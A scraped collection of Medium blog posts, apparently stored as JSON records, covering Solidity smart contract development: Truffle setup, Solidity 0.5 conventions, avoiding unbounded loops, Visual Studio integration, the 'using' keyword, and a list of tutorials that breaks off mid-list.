documentation has fallen behind the times slightly, at least at the time of this writing \u2014 the examples are still showcasing Solidity 0.4 (the current version introduces a collection of new features and breaking changes from the previous version) with out of date and somewhat uninspiring example contracts. I find Truffle Boxes a more inspiring resource to browse through.What we will cover here: IDEs & tools, importing and compiling contracts, breaking changes and conventions.In this article we will firstly overview the IDEs at your disposal to be developing Solidity smart contracts, before visiting important concepts to adhere to when writing Solidity contracts, and how to ensure we utilise them correctly. We\u2019ll also visit the structure of a smart contract and popular conventions used when writing them.If you would like to contribute to Solidity, documentation is one of the most requested aspects to be contributing to at this time. Although contributing to the language is an entirely different talk, check out the Solidity Contributing page if you\u2019d like more information on the subject.With that, let\u2019s start familiarising ourselves with Solidity 0.5 and suitable software for developing with it \u2014 you will most likely be able to integrate Solidity development into your favourite IDE.Prerequisite: Setting up your workspaceThere are a couple of notable browser-based IDEs that you can utilise to develop Solidity smart contracts in the event that you do not use a dedicated IDE: Along with the Remix online IDE recommended in the Solidity docs, we also have ETHFiddle (Similar to JSFiddle) that allows you to run contracts online and share them throughout your network.IDE Solidity SupportI personally prefer installing support for Solidity in my favourite dedicated IDE, opting for Sublime Text over other offerings. Let\u2019s briefly visit some of the packages available for your IDE:Sublime Text: The Ethereum package is available for Sublime Text, as well as a linting package named SoliumLinter. SoliumLinter is used to analyse your Solidity code and check for errors within the Sublime Text IDE.Visual Studio: A Solidity package is available on the Visual Studio Marketplace, enabling Solidity smart contract development in the VS IDE.Atom: The language-ethereum package is available for Atom bringing syntax highlighting and snippets to Solidity and Serpent files in Atom.Emac: Enable Emac Solidity mode.Vim: Enable Solidity syntax with vim.Install the relevant package for you and fire up a new project.The next tool we will visit is Truffle. The Truffle Suite is a set of tools designed to aid in the entire Ethereum Dapp development process \u2014 but Truffle itself is very good at aiding in the development of Solidity Smart Contracts \u2014 this is what we will focus on in more detail here.To get up to speed with Truffle and to save repetition, check out my introductory article on the suite:Introduction to the Truffle Suite and Dapp Development PipelineBreaking down the Ethereum Dapp Development pipeline using Truffle, Ganache and Drizzlemedium.comUpdate to the latest Truffle and Solidity versionsIt is worth mentioning the importance of keeping Truffle and the underlying Solidity compiler up to date. Run the following commands to install the latest versions of Truffle and solc (Solidity compiler) packages:npm install -g truffle@latestnpm install solc@latestTake note of the latest version of the Solidity compiler in-particularly to guarantee your smart contracts will adhere to the latest Solidity standards. They change quite frequently!Exploring & Importing Solidity ProjectsAt this point you may wish to import some ready-made smart contracts into a Truffle project. Let\u2019s briefly do this now to get a feel for what completed contracts consist of, as well as familiarising ourselves with the import process.MetaCoin \u2014 Basic Truffle ProjectA bare-bones project we can use for familiarisation purposes is the MetaCoin project, provided as a Truffle box. Import the project in a new folder by unboxing MetaCoin with the following commands:mkdir metacoincd metacointruffle unbox metacoinThis bootstraps a Truffle project with the contracts/MetaCoin.sol contract. Not only is this contract written with Solidity 0.4, it is also incomplete and does not adhere to the ERC20 standard; not very useful.However, the contracts are valid syntax and will indeed compile. Run truffle compile now to observe a successful deployment.Take a peak at the MetaCoin.sol file and see if you understand what is happening. We will visit this syntax later on in the article in relation to Solidity 0.5.ERC721 Standard by 0xcertNext, let\u2019s briefly visit a completed production-ready token, by importing the ERC721 standard into our project. Check out the contracts here on Github or the project homepage here.About the ERC721 standard:ERC721 contracts adhere to a standard for Non-Fungible tokens. Every token is unique and could have a different value. Use cases include collectables apps such as Crypto Kitties and similar offerings, whereby every Kitten is represented by a unique token ID.Within the /src/contracts/tokens folder there is a basic NFToken offering as well as two extended contracts; one for additional MetaData, and one for Enumeration. Contracts starting with erc721- contain function signatures required to adhere to the standard, whereas contracts starting with nf-token- are the actual implementations.These contracts also import utilities from the utils/ and math/ folder one level up. Let\u2019s import the entire contracts/ folder into our Truffle project.Clone the entire project outside of your local metacoin/ folder and copy the contracts into its contracts/ folder:# clone ERC721 project and copy contracts into metacoincd ..git clone https://github.com/0xcert/ethereum-erc721.gitcp -R ethereum-erc721/src/contracts/* metacoin/contractsIn order to migrate these contracts we will need to add a new migrations file. Add a 3_deploy_nftoken.js file within metacoin/migrations/, importing the MetaData NFToken contract for deployment:# metacoin/migrations/3_deploy_nftoken.jsvar Migrations = artifacts.require(\"Migrations\");var NFTokenMetaData = artifacts.require(\"NFTokenMetadata\");module.exports = function(deployer) {  deployer.deploy(Migrations);  deployer.deploy(NFTokenMetaData);};And finally hop back into metacoin/ and migrate them:# migrate the contracts within metacoincd metacointruffle migrateExcellent, we already have some Solidity management workflow under our belt.Let\u2019s next talk about some underlying Solidity 0.5 conventions.Common Errors and Underlying Solidity ConceptsRunning various Truffle commands allows us to test our smart contracts in real time: truffle compile, truffle test or truffle migrate will all summon the Solidity compiler to compile the latest version of your Solidity contracts.By utilising these features we can test the validity of our Smart Contracts and iron out bugs before they are deployed on our test blockchain, whether it be Ganache or any other client.Now, if an error is found in your contracts, useful output is provided to us by the Solidity compiler, as well as suggestions on how to fix that error. Let\u2019s explore some Solidity errors you may encounter, and talk about the underlying concepts of Solidity we need to adhere to in order to prevent such errors.These errors may range from any of the following:Forgetting to define a function as internal or external.internal functions can only be called within the contract they are defined in (as well as by internal library functions and inherited functions). external functions can be accessed by other smart contracts and via web3 calls, and consist of their own signature and address.Forgetting to define a function type as view, pure or payable.Functions need a type to determine their scope and capabilities in terms of what contract state they have access to, and what they can manipulate.A function is of type view if no contract state is changed within that function. In other words, it cannot alter the behaviour of future interactions with any contract. They can only call other view or pure functions.A function of type pure is even more restrictive; pure functions can only depend on the arguments passed into them. Like view, they cannot utilise the msg object, send or receive ETH, or refer to the block object.payable functions have the ability to accept ETH payments, and this could also be a payment of 0 ETH. Providing an ETH amount of 0 will still be valid, the point here is that the function will accept this value and be able to process it.Forgetting to provide a reference type to function arguments or function variables, as memory, callable or storage.This is a requirement as of Solidity 0.5.These are called reference types, and arrays and structs now need a reference type applied to them. A reference type is simply a reference to the data location of where the value is stored.Arguments of external functions will be referenced as calldata. A variable referenced as memory will indeed be stored in memory, making it temporary. A variable referenced as storage will be stored permanently. In practicality, function arguments are general memory whereas contract state variables and local variables are storage.We now begin to realise the importance of a reliable compiler with reliable error reporting. Truffle will provide us with this, letting us know where we have assigned the incorrect reference type, and which one to correctly use.Not returning the correct type from a functionWithin Solidity we can either define a type of value (or tuple, or Struct) to be returned from a function, or the type followed by a variable. For example:function ownerOf(uint256 _tokenId)    external    view    returns (address _owner)  {    _owner = idToOwner[_tokenId];    require(_owner != address(0));  }In the above function we define the _owner return variable and simply write a value to it within the function block. No return statemement is needed.We could rewrite this function to just define the return type and include a return statement:function ownerOf(uint256 _tokenId)    external    view    returns (address)  {    address _owner = idToOwner[_tokenId];    require(_owner != address(0));    return _owner;  }Both cases are valid, and ultimately is the developers decision on which to use.Overlooking illogical syntaxOnce we have carefully designed our smart contract along with our function signatures, we then need to be sure that the logic inside them do indeed adhere to the function\u2019s type. For example, we do not want to attempt sending a transaction from within a view function.Luckily, attempting to compile contracts will fail if these errors exist. The Solidity compiler will always pick up type errors.Giving functions too much scopeConversely, giving a function too much capability that it does not use will flag a warning. If a function is typed as payable but only adheres to a pure function, then the Solidity compiler will let us know and suggest the more suitable type.Attempting things that Solidity does not support yetIf we attempt to return a type that is not supported within Solidity at this time, the compiler will fail and make it clear why. For example, trying to return an array from a function is not supported.Conversely, if Solidity does support such a feature, but such feature is part of an experimental feature set that you specifically have to define, the compiler will also let us know, and provide the line of code to be included at the top of your contract \u2014 most likely a pragma statement.An example of this is constructing an array of a Struct type within a for loop.General syntax errorsOf course, general syntax errors like spelling errors or missing semi-colons will be flagged, line number and code.The Structure of a Solidity Smart ContractHow can we minimise the probability of introducing errors in our smart contracts beyond a distraction-free environment and a high dosage of coffee? By making sure our contracts are organised and adhere to some sort of structure.The high level structure of a smart contract in Solidity, with some example code, is as follows:// Solidity versionpragma solidity 0.5.3;The version of Solidity being used is always a requirement.// importsimport \"./ERC721.sol\";import \"./utils/supports-interface.sol\";import \"./utils/address-utils.sol\";...Imports of other contracts. These may be utility or helper functions, for example, signatures for all the functions that adhere to the ERC721 standard.// Contract Variablesaddress internal owner;mapping (uint256 => address) internal idToOwner;uint256 internal totalTokensMinted;...Contract variables are defined next, storing contract state. These can range from public addresses of other accounts, key value indexes with the mapping type, and primitive types like unsigned integers. All the contract variables above are internal, meaning only contract functions can read and write to them, however this is not a requirement.// Eventsevent TokenCreated(    address indexed tokenAddress,    string name,    string symbol,    address owner);...Next we define the Events of our contract. Events can be called from within our contract functions for the purpose of registering that something happened within smart contract execution. This event is consequently recorded on the blockchain.This allows external applications or APIs to listen to Events from the blockchain and update their UI or databases accordingly.For example, A React app with web3 installed could listen to a Transfer event of an ERC20 token, and update its UI to reflect the balances of the sender and receiver. Events can represent anything the developer chooses, and are dependant on the design of the contract.// Modifiersmodifier isTokenAvailable(uint256 _tokenId) {    uint256 tokenStatus = idToTokenStatus[_tokenId];    require(        tokenStatus == 1,         \"Token is not available to transfer\");    _;}...function transferFrom(    address _from,    address _to,    uint256 _tokenId  )    external    isAvailable(_tokenId)  {    ...  }Modifiers are extensions of functions that execute before the function it is modifying in order to inject additional functionality, mostly in the form of checks and requirements of function arguments and contract state.In the example above we are extending transferFrom() with the isAvailable() modifier to check if a token is available to transfer. Within the modifier we use Solidity\u2019s require() method, which reverts execution upon a condition not being met. It also takes a second argument; a message to return upon a false result.See the underscore and semi-colon below this require statement?: This is where the function we are modifying is executed. We are essentially saying: I want this token\u2019s status to be available before I execute transferFrom.We can attach multiple modifiers to a function to check a range of conditions. Modifiers keep our code clean and adhering to DRY (Don\u2019t Repeat Yourself) principles. Cutting down code will also save gas fees upon deployment.// External Functionsfunction mint(address calldata _to, uint _amount)   external  payable {     ...     //call the internal minting function    _mint(_to, _amount);}External functions can now be defined. As we mentioned earlier on, external functions can be called from other contracts and public addresses. In the above example we define a mint() function. mint() handles the arguments needed to mint a token. It is payable and receives ETH in order to do so. Once the conditions are verified, mint() then calls an internal function, _mint(), in order to carry out the actual minting.Why would we have multiple mint()\u2019s consiting of internal and external functions? Well, I may wish to mint tokens in different ways.A mint(address _to) function could accept one recipient, whereas a mintMultiple(address[] _to) would accept an array of addresses, which would be looped through, but still utilise the same internal _mint() function to do the actual minting to the addresses.//Internal Functionsfunction _mint(address[] calldata _to, uint _amount)   internal {     ...     //call the internal minting function    _mint(_to, _amount);    emit TokenMinted(_to, _amount);}And finally, internal functions can be defined within our smart contracts. An emit statement is also included here, showing that an Event can be emitted within a function.Commenting syntaxBefore wrapping up this talk on Solidity 0.5, it is worth mentioning commenting syntax that the Solidity compiler can also pick up and warn you about in the event your comments are not adhering to the expected conventions.Take the following example from the ERC721 basic token transferFrom() method:/**  * @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved  * address for this NFT. Throws if `_from` is not the current owner. Throws if `_to` is the zero  * address. Throws if `_tokenId` is not a valid NFT. This function can be changed to payable.  * @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else  * they maybe be permanently lost.  * @param _from The current owner of the NFT.  * @param _to The new owner.  * @param _tokenId The NFT to transfer.  */function transferFrom(    address _from,    address _to,    uint256 _tokenId)...Notice the following conventions here:@dev is used to signify a comment for developers of the contract@notice is used to signify important warnings about function usage@param is used to outline each argument of a function. If we document an argument that does not exist, the Solidity compiler will warn us about this.@return is used to document the return type of the function. The above function does not return anything, therefore @return is not used.Where to go Next?I hope this article has given you enough to whet your appetite for writing Solidity contracts.The official Solidity documentation does indeed go into the details and underlying workings of the language in a far greater depth than this article. Even though the examples are out of date it is a valuable, free resource for delving into Ethereum smart contract development.After reading this article familiarising yourself with the documentation should be more of a breeze, starting with the introduction:Introduction to Smart Contracts \u2014 Solidity 0.5.3 documentationA contract in the sense of Solidity is a collection of code (its functions) and data (its state) that resides at a\u2026solidity.readthedocs.io", "responses": 2, "tags": ["Ethereum", "Solidity", "Programming", "Software Engineering", "Blockchain Development"]}, {"title": "Getting Loopy with Solidity", "post_link": "https://blog.b9lab.com/getting-loopy-with-solidity-1d51794622ad?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://blog.b9lab.com/@robhitchens", "publish_date": "2018-10-16", "last_modified_date": "2019-03-21", "readtime": "8.96", "claps": 429, "voters": 49, "content": "Getting Loopy with SolidityHow to Avoid Unbounded \u201cFor\u201d Loops in Solidity Smart ContractsRob HitchensFollowOct 16, 2018 \u00b7 9 min readLet\u2019s begin with a few questions:What is an unbounded for loop?Why is it an anti-pattern?How to avoid it?Image credit: Tine Ivani\u010dAn unbounded for loop is any loop that has no constraint on the number of iterations. In other words, cases where there is no obvious limit.For example:\u201cfor every user, do something \u2026\u201d when there is no apparent limit on the number of users.\u201cfor every item, do something \u2026\u201d when there is no apparent limit on the number of items.for(i=0; i<?; i++) { // danger ahead }It\u2019s familiar-looking and deadly. In Solidity, we need to avoid that because it won\u2019t scale. Suppose it read \u201cFor i equals 0 to unmitigated disaster.\u201dNone of us sets out to build software that will lock up and fail after too many people use it. At least not on purpose, because we are nice people.Why won\u2019t it scale?Because gas and gasLimit.\u201cgas\u201d is the unit of account for computational work used to pass on the cost of every transaction to the user. More work equals more gas which costs more to execute. Imagine your CPU sent you a bill for every single operation. Imagine no more!This is the reality of the Ethereum Virtual Machine. Someone always pays. You don\u2019t need to memorize the whole price list, but newcomers should internalize the idea that there is always a full accounting of everything that happens and nothing is ever free. See OPCODE Gas Costs (not perfectly up-to-date, but there\u2019s a handy link to the Yellow Paper in there).\u201cblock.gasLimit\u201d is a network property voted on by the miners. As developers, we don\u2019t control the gas limit, but we know it exists. You can think of it as the size of the fuel tank. If a transaction runs out of gas then the transaction will revert. We can\u2019t (currently) run a transaction that exceeds the block.gasLimit.The block.gasLimit is an evolving property of the Ethereum network. (Image credit: ethstats.net)Imagine you and your users are in an airplane. The further you want to go, the more gas you will burn. There is a maximum limit to the fuel you can carry and therefore a maximum distance you can fly. If you aim too far away, you will run out of gas before you get there and then bad things will happen ...The gasLimit adjusts over time (the miners vote on it) so you can never be too sure how much is too much, but you can be certain that there is a hard stop when you reach that point. You need to plan your journeys so you complete each step before that happens.You can safely do as many short hops as you want, refueling at each stop. Doesn\u2019t it make sense to think in terms of multiple, small, safe hops instead of depending on big risky moves?So, if you are thinking about any process in terms of for every customer, or for every item, you are probably overlooking the limits of your machine. You are probably thinking about the wrong solution to the problem. This sort of thing isn\u2019t an error in a particular line of code. It\u2019s a misguided approach.TL;DREvery step costs money. Some processes are more expensive than money can buy. This necessitates a new focus on efficiency.In Ethereum, unlimited work is not an option. This means some your favorite \u201cgo-to\u201d patterns and the obvious solutions to many everyday tasks are precisely what we must not do.Examples to avoid:Search for a record of interest in a list of unlimited size.Search for an insertion point in an ordered list of unlimited sizeRead or write too many items in a list of unlimited size.Reorganize list items in a big way such as a sort, roll up or splice.Recursively call contract functions with unlimited depth.How can we avoid getting loopy?There are plenty of reasons to want to iterate over n instances of something. Finding ways around such tendencies calls for new ways of thinking.Let\u2019s look at a few examples.Avoid Sortsfor(i=0; I < records.length-1; i++) { for(j=i+1; j < records.length; j++) {  // compare record[i] and record[j]  // swap records if needed }}The classic bubble sort algo gets the job done if you have unlimited compute resources or a very small list. But we don\u2019t have unlimited resources and we must not approach problems this way. How on earth can we accomplish such a thing without using loops?This may seem hard to accept, but the first thing to do is to look for ways to avoid sorting anything. That\u2019s why you so seldom see professionally-crafted contracts doing sorts. Here\u2019s why and how: The Joy of MinimalismRely on 1-step lookupsOne of the reasons we like to sort data is to find things efficiently, right? What if we could find any record in exactly one operation and also enumerate the complete list of everything stored? Would it still be vital to sort the data?Have a look over here for a popular pattern that does it all with unordered lists: Solidity CRUD.Ordered lists make it worseIt\u2019s hard to beat 1-step look-ups. Ordered lists are much more work and often unnecessary, which is why we look for ways to avoid them.In that rare case that contract logic depends on an ordered list, then you must be extra cautious to ensure that there is always a way to contain the cost so you can guarantee that cost will be scale-invariant. To the author\u2019s knowledge, there is no known algorithm that can index or sort a list of unordered data without increasing the cost by some factor of scale. For example, O(log n).A solution to this problem is to break the mission down into smaller steps that the contract can complete at a fixed cost. This will likely involve externalizing some concerns, meaning, more reliance on outside help than seems obvious.Use HintsFor example, clients can send hints to contract functions.In the linked experimental pattern, the contract maintains an ordered list of everything thrown at it. Clients tell the contract what they want to insert and also give the contract hint about where to put it. The contract checks the acceptability of the request because the contract assures system integrity: LinkedList (with hints)Not so fast.Consider the following:Even if a client diligently searches and presents perfect hints, the situation may change before a transaction is mined, which means the hint may not be perfect anymore. If the contract disagrees with the hint about where to put something rather than rejecting the request outright, the contract conducts a regional search to find the right location, starting from the hint. If the correct spot can be located before it runs out of gas, then the insertion succeeds.It will always be possible to use the contract and always at a scale-invariant cost. A bulls-eye (perfectly accurate hint) is the same cost at any scale. There are similarly predictable costs for missing by 1, missing by 2, etc., which is what we want. It\u2019s not even vital that the hint is any good at all but the more the lazy software client misses, the higher the cost to the client.If the author\u2019s reasoning on this is correct, the worst-case scenario is so much data pouring into the contract that careful clients still miss by a lot because the contract state changes significantly before transactions are mined. Client costs are roughly overhead + O(missed by), so miserly clients slow down until there is less contention. The contract doesn\u2019t fail in any case and life goes on at any scale. That\u2019s the top priority.The above is certainly not the only approach. Apart from dispensing with the ordered list concern entirely, which we should do if we can, the point of the example is the vital importance of finding a solution that doesn\u2019t imply increasing cost or limits to scale.Queries and Filtered ListsQueries are often cited as a justification for iterative processes. A developer might say something like \u201cI need to return a list of all the \u2026\u201d.At the risk of seeming pedantic, \u201cI need\u201d seems to get the discussion off on the wrong foot. The developer is not normally a participant in the system architecture, so how can the non-participant have a need? This is not a good description of actual requirements. Perhaps someone has a need, but it\u2019s not the developer. Who? Why? Let\u2019s think carefully about that.There\u2019s a user interface, perhaps one or more servers, and a system of contracts. Let\u2019s say some component in the system will produce a list because a client needs it a certain way. Fair enough, but it\u2019s not necessarily the contract\u2019s job to do that and we shouldn\u2019t assume that it is. Using the contract for this purpose should be avoided where possible, and it\u2019s almost always possible: see The Joy of Minimalism in Smart Contract Design.What about returning arrays?The author has very mixed feelings about the trend toward increasing support of strings, dynamic arrays and structs in the ABI. Admittedly, pioneers learned to get by with fixed-size interfaces, so now we know patterns to follow. That makes the dynamic stuff seem far less vital than it might seem to newcomers who are accustomed to object-oriented languages.The discomfort is not merely about clinging to idiomatic patterns that have worked well for a considerable amount of time. The real source of the author\u2019s hesitation is that it seems to encourage rather than discourage unscaleable patterns and it seems to encourage complexity in a setting where we should be striving for simplicity itself.If we\u2019re sure that the largest possible array and the process that assembles it and sends it will always complete at a cost below the block.gasLimit, then it\u2019s technically feasible. The challenge is being sure. Given that (probably) no amendment of the contract will be possible, what is plan B in the case that the list-wise function becomes too expensive to be feasible or stops working entirely?Amortisation of WorkA solution to that problem that provides maximum certainty is a more granular function that returns one item or one part of the solution at a time.Consider this:Software clients are not constrained by how many separate calls they make to a contract but each contract transaction and call is severely constrained by the maximum allowable computational complexity. So, we should work with patterns that move consumption from the resource that\u2019s scarce to the resource we have in abundance. Too abstract? It\u2019s better to have a software client make 1000 tiny contract function invocations to complete 1000 steps, instead of a contract function that repeats a step 1000 times.Nick Johnson calls this \u201cAmortisation of Work\u201d.Wait. What about race conditions?Good! Now we\u2019re thinking about implementation details. We can\u2019t leave half-baked contract states out there. Each atomic operation has to leave the contract in an acceptable state. This isn\u2019t necessarily easy, but it\u2019s the right difficult problem to work on.In summary, take any process that adds up to a variable amount of work and possibly a lot of work inside the contract, and turn it into a lot of small fixed-cost operations directed by the client side. When you do that, you will often find there is no longer a need for the big list-wise operation originally contemplated. Some readers may recognize that seems a lot like the concept of inverting control.Amortisation of work is a very useful patternWant to get all the rows from an array? Feed them to clients one row at a time. Instead of the client requesting the list, the client will request one item at a time.Want to send all the users a dividend? Compute their entitlement (once) and wait for clients to claim them individually. This has the added benefit of externalising the cost of the distribution.Want to sort or filter an array? Leave that to the \u201csoftware client\u201d which could be a caching server as is the case with exchanges and explorers like etherscan.io. You didn\u2019t think they inspect the blockchain for every web request, did you? Of course not. They know better. Blocks arrive, things have happened, the off-chain high-performance database is updated because such things are designed to deal with ordering, filtering, joining and so on. This is also why you can see things on block explorers that are simply not there when you explore raw block data.As Nick Johnson puts it:Any loop like the one in the snippet above should set your spidey-sense tingling, and the first thing you should look for is a way to amortise the work being done.And that\u2019s what this post is all about.It\u2019s hard to accept (and even harder to adjust to) the need to amortise work. Doing so will affect the way you imagine architecture and control flows, the functions and the way you structure storage.At B9lab, we are dedicated to guiding students to the top of this field. Our hands-on training programs mentored by instructors like myself and workshops prepare students for stringent certification exams.Start with your Ethereum Developer Certification and consider branching out to Quorum Specialist (think \u201centerprise\u201d) or Quality Assurance Specialist (think \u201csmart contract auditor\u201d). Maybe even check out Hyperledger, Corda and EOS. They too are interesting and different.", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Best Practices", "Blockchain Development"]}, {"title": "Solidity Integration with Visual Studio", "post_link": "https://medium.com/@ConsenSys/solidity-integration-with-visual-studio-8bdab2ff8a74?source=search_post", "author_name": "ConsenSys", "author_link": "https://medium.com/@ConsenSys", "publish_date": "2016-04-01", "last_modified_date": "2019-05-22", "readtime": "5.26", "claps": 109, "voters": 47, "content": "Solidity Integration with Visual StudioConsenSysFollowApr 1, 2016 \u00b7 6 min readCale Teeter, Senior Software Engineer, DX, MicrosoftGetting Started with SolidityYesterday we were proud to announce the integration of Solidity and the Smart Contracts that work with Ethereum blockchains into Visual Studio. This exists as an extension that is available here. This extension was designed to lower the bar to working with blockchains and make this a seemless process from inside the world class IDE.The extension is free, and we have put together some steps to further help you get started using this.PrerequisitesTo get started you will need to be using Visual Studio 2015 Community, Professional, or Enterprise edition. You will also need to download the Solidity extension from the Visual Studio Marketplace. You can download that here. After installing the extension, you will need to restart Visual Studio. Also, nodejs will need to be installed to allow local deployments for development. This can be downloaded here. (download the latest LTS version)Create your first Decentralized ApplicationAfter the extension has been installed, next you can create a decentralized application that will be used to author, compile and deploy smart contracts.From the File menu, click new Project.2. In the New Project dialog box, click on Solidity under Installed Templates, and then select DecentralizedApplication. Name the application, MyDecentralizedApp, and then click OK.3. Next you will see a few things happened. A README document was opened in the Visual Studio main window and the project was setup with some folder and sample files. The README explains how to setup a local keyserver in order to deploy smart contracts to a development blockchain instance.a. First download and install the latest version of bloc from Consensys. To do this, open a cmd prompt, navigate to a directly where you would like to install the keyserver and run the following command: npm install blockapps-blocb. Next create the instance of bloc from the core by running the command: bloc init. This will prompt you for some values that will be used the instance. Enter a name of your choice, and user name, and accept the default for the apiUrl. This is the ethereum node that will hold the actual blocks that your account/contracts will be deployed to.c. Now change to that directory and install the required node packages by running the following command: cd <appname> && npm installd. Finally you are ready to start the bloc instance by running the following command: bloc start4. Now we have a keyserver running. This local keyserver will run on port 8000 by default. The Visual Studio extension is configured to use this server by default, with a user named: testuser and a password: testing. You can view and edit these changes by running the following:a. Right click the project in solution explorer.b. The dialog here shows the configuration values that are set by default, and can be adjusted if needed. (they will not need to be adjusted in most cases)5. At this point we have a keyserver running locally, now we have an endpoint that we can deploy our smart contracts to (as well as create new users). So now we can get started with development of smart contracts.Working with Smart Contracts (authoring, compiling, deploying)Now that the foundation is place, we can take a look at working with Smart Contracts. By default a folder named samples will be created with some sample contracts already included. When you are just getting started with Solidity, these are a great source of reference.To get started, we can use the Payout.sol smart contract. First, we can examine the contract in the Visual Studio code window. When we are satisified with what we have authored, we can then compile this contract. This compiliation will take place on the local machine. The output from the compliation will be in the output window of Visual Studio,Compilation1. Compile the smart contract2. The output for the compilation is found in the output window. If you don\u2019t see the output window in the lower part of your screen you can open from the View -> Output menu (or Ctrl + W, O). If there any errors with the compilation, it will be shown in the output window as well.DeploymentThe deployment is nearly as simple as the compilation. The deployment will send the smart contract to your local keyserver which will communicate with the underlying blockchain. What is actually happening is this.1. First, VS will use the project properties (shown earlier) to determine the bloc server to communicate with (url).2. Next VS will call this server, asking if the user in the project properties, exists.a. If it does exist, the address of the user will be returned to Visual Studio.b. If it doesn\u2019t exist, a new user will be created, and that address will be returned to Visual Studio.3. Next, VS will get the source for the contract, along with the address of the user and post this to the bloc server.4. Finally, your default browser will be opened to a dynamically created html page of the smart contract that was deployed.5. When the browser opens, you can enter the password for the bloc server (default is testing).6. You can then exercise the contract. For example, you can send in a value in Ether by post 1 to the setup box.Next StepsAt this point, congratulations, you have now entered the blockchain universe! I will be posting some more tutorials to expand on this.", "responses": 14, "tags": ["Ethereum", "Visual Studio", "Solidity"]}, {"title": "Solidity\u2019s \u2018using\u2019 keyword", "post_link": "https://medium.com/coinmonks/soliditys-using-keyword-c05c18aaa088?source=search_post", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2017-08-22", "last_modified_date": "2018-12-11", "readtime": "1.36", "claps": 312, "voters": 46, "content": "Solidity\u2019s \u2018using\u2019 keywordGustavo (Gus) GuimaraesFollowAug 22, 2017 \u00b7 2 min readThere comes a time when one wonders the meaning behind certain features in the programming language one enjoys coding with. Lukas Cremer, Gerard and I are blockchain developers based in Berlin, Germany, and we challenged ourselves whether we could explain the use of solidity\u2019s using keyword.using is used for including a library within a contract in solidity. Check this following example:pragma solidity ^0.4.15;library SomeLibrary  { function add(uint self, uint b) returns (uint) {   return self+b; }}contract SomeContract {        using SomeLibrary for uint;        function add3(uint number) returns (uint) {        return number.add(3);        }}The code using SomeLibrary for uint; allows us in this example to use return number.add(3); inside the function add3 . It is basically syntactic sugar for the following:pragma solidity ^0.4.15;library SomeLibrary  {function add(uint self, uint b) returns (uint) {   return self+b; }}contract SomeContract {        function add3(uint number) returns (uint) {        return SomeLibrary.add(number, 3);        }}As we can see, by adding the keyword using we could give any uint within the SomeContract the libraries functions and pass the uintas the first parameter of that function.Now let\u2019s look at another example:pragma solidity ^0.4.15;library SomeOtherLibrary  {   function add(uint self, uint b) returns (uint) {     return self+b;   }   function checkCondition(bool value) returns (bool)  {      return value;   }}contract SomeContract {    using SomeOtherLibrary for *;function add3(uint number) returns (uint) {        return number.add(3);        }        function checkForTruthy(bool checker) returns (bool) {        return checker.checkCondition();        }}Here the * allows for any type from the SomeOtherLibrary to be accessed in the contract.Another thing we realized is that this also works for array and struct types but one needs to declare the storage keyword. But this is a topic for another blog post.Thanks to Lukas Cremer and Gerard Baecker for helping with this blog post.", "responses": 2, "tags": ["Ethereum", "Solidity", "Blockchain", "Blockchain Technology", "Tutorial"]}, {"title": "Top Tutorials To Learn Ethereum & Solidity at Different Level", "post_link": "https://medium.com/quick-code/top-tutorials-to-learn-ethereum-solidity-at-different-level-23700a04ae80?source=search_post", "author_name": "Quick Code", "author_link": "https://medium.com/@QuickCode", "publish_date": "2018-05-10", "last_modified_date": "2019-05-09", "readtime": "10.4", "claps": 191, "voters": 44, "content": "Top Tutorials To Learn Ethereum & Solidity at Different LevelQuick CodeFollowMay 10, 2018 \u00b7 11 min readThe digital cryptocurrency Bitcoin was the first Blockchain application. Success of Bitcoin led to the creation of the Ethereum platform. Whereas Bitcoin is a \u201cBlockchain Application\u201d, Ethereum is a \u201cBlockchain Platform\u201d. Ethereum not only supports a distributed ledger but it also supports Smart Contracts.Smart Contracts are computer programs that has the code that implements contractual agreements (rules) between two or more parties. The rules coded in the smart contract are triggered by events in the physical world and automatically carry out some predefined action(s). All of this happens without any intermediary, web servers or back end databases.Let me give you an example \u2014 Ebay is the intermediary between the buyer and seller. EBay makes $ every time a buyer buys an item from the seller. In a decentralized bidding application a smart contract can replace EBay the intermediary. The rule coded in the contract will be that when buyer will pay, the seller will ship the item to the buyer. The funds will be held in the smart contract till buyer confirms the receiving of the goods. Once the buyer confirms the receipt of goods the funds will be released to the seller. Smart Contracts are executed on the Ethereum network nodes as opposed to a centralized server infrastructure owned by an intermediary (e.g., Ebay). Nodes are Ethereum client processes running on the network participant\u2019s computer.Anyone can write Ethereum decentralized application, so in other words you can create your own Bitcoin like Cryptocurrency or Ebay like application on a public Ethereum network. Please note that all applications are not a good candidate for Blockchain technology for example building a static website on Blockchain technology is not the right use of the technology.Solidity is a programming language for writing Smart Contracts. Essentially, think of it as a way to control a bank account with code. With Solidity, we can write applications that simulate a crowd funding campaign, a lottery, a loan, or any other type of financial instrument. Don\u2019t be intimidated by learning \u2018another\u2019 programming language; Solidity is known to be quite similar to Javascript and exceptionally easy to pick up for anyone who has previous JS experience. This course will give you all the tools you need to master Solidity.Follow the best solidity courses series to see the most updated and top-rated tutorials and courses on solidity based on rating and reviews and quality.1. Solidity programming for beginners \u2014 cryptocurrency ethereumHow to create your own smart contracts and ICO token.Cryptocurrencies are currently a really hot topic. Bitcoin, Ethereum, Ripple, IOTA, EOS, Stellar, Cardano, NEO, Monero, RaiBlocks.Most people only have an Investment view. The real interesting thing however is the technology behind that \u2014 the blockchain.While Bitcoin is limited to pay for services other cryptocurrencies try to address different problems. One of the most interesting cryptos is ethereum (ETH).This course is meant for beginners with one specific goal. Students who are interested in how to program an ethereum smart contract in solidity will get the chance to learn the fundamentals required to do that. Together we will learn and apply the solidity syntax. At the end we will program an ICO (inital coin offering).Finally you will be able to decide for yourself whether this topic excites you and whether you want to dive deeper into it.Before we start please note that this course is not about explaining what a cryptocurrency is. This is a programming course so we immediately start with the coding basics you need.2. Compile Your First Ethereum Smart Contract With SolidityLearn how to set up your own private blockchain node using Geth, Solidity, and Mist.I will walk you through how to compile and run your first smart contract on a local test environment.This will includeInstalling Solidity, which used used to compile the contract into byte code that can be deployed on the blockchain.Installing Geth, which runs a local node and also has a JavaScript command line that can be used to talk to the blockchain.Create a private local node, so you can experiment without spending money.Create a couple of test accountsDeploy the smart contract into the test blockchainCall the functions of our smart contract to see that it is working.We do not cover:Solidity programming in depth, only show how to set up environment, compile and interact with contract.Workflow and IDE\u2019s for programming3. 